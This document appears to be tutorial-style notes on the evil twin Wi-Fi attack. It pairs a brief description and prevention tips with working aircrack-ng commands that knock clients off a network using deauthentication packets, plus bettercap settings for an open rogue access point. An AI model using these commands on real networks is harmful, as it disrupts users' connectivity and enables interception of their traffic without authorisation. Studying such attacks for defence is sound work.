# Evil Twin Attack

- A type of MitM attack
- Description: The attacker sets up a rogue Wi-Fi access point that mimics a legitimate network. Devices connect to it, allowing the attacker to intercept all traffic
- Key Characteristics:
    - The rogue network often has a similar name to the real network (e.g., "FreeWiFi")
    - Victims unknowingly connect to the attackerâ€™s network
- Prevention:
    - Educate users to verify SSIDs before connecting
    - Enable **Mutual Authentication** on enterprise Wi-Fi setups

### Disconnect user from wifi

```sh
# Install the Aircrack-ng suite, which includes airmon-ng
sudo apt install aircrack-ng

# Check wireless interface
iwconfig
# -> E.g output
lo        no wireless extensions.
enp4s0    no wireless extensions.

# Disconnect the wireless adapter from managing a network
sudo airmon-ng check kill

# Enable monitor mode on your wireless adapter
sudo airmon-ng start wlo1

# Verify

# Start capture packets
sudo airodump-ng wlo1mon

# Find the channel of wifi
sudo aireplay-ng --test wlo1mon
# -> If it fails, your card may not support Packet Injection

12:26:46   0/30:   0%
# -> We will taget 'A14-01' wifi, its channel is 2

# Stop the process capturing packets and start capture packets only on channel 2
sudo airodump-ng --channel 2 wlo1mon

# Deauthenticate target device from wifi by sending deauth packets
sudo aireplay-ng --deauth 100 -a [BSSID] -c [Client_MAC] wlo1mon
# E.g
sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 -c F2:2A:23:9E:54:E2 wlo1mon
# E.g output
12:24:18  Waiting for beacon frame (BSSID: CC:71:90:62:9E:98) on channel 2
12:24:18  Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|42 ACKs]
12:24:32  Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|326 ACKs]
12:24:33  Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 1|253 ACKs]
# Or omit to target all devices
sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 wlo1mon


```

- Stop capturing packets (exit monitor mode)
```sh
sudo airmon-ng stop wlo1mon
sudo systemctl restart NetworkManager
```

### Create the rogue access point

```sh
sudo apt update
# net-tools include netstat which is used inside bettercap
sudo apt install net-tools
sudo apt install bettercap


# Rogue access point
sudo bettercap -iface wlo1mon

# In bettercap:
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false
wifi.recon on; wifi.ap

```
